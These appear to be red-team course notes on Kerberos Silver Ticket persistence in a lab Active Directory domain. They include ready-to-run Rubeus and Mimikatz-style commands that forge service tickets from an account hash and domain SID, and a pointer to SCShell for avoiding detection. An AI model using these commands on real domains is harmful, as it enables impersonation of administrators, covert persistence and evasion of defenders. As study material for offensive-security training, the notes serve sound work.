- A valid Service Ticket or TGS ticket (Golden ticket is TGT). 
-  Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account. 
-  Services rarely check PAC (Privileged Attribute Certificate). 
- Services will allow access only to the services themselves. 
-  Reasonable persistence period (default 30 days for computer accounts).

## Persistence - Silver Ticket - Rubeus

- Forge a Silver ticket. :
```
C:\AD\Tools\Rubeus.exe silver /service:http/dcorpdc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt 
```
- Just like the Golden ticket, /ldap option queries DC for information related to the user. 
-  Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS and many more.
- Create a silver ticket for HOST SPN which will allow us to schedule a task on the target: 
```
C:\AD\Tools\BetterSafetKatz.exe “kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local  /service:HOST /rc4:6e58e06e07588123319fe02feeab775d /startoffset”0 /endin:600 /renewmax:10080 /ptt” “exit”
```

- Creating task on the target will be detected and it will be noisy (to do this without getting detected we can use scshell([https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)) that will modify the service(out of scope))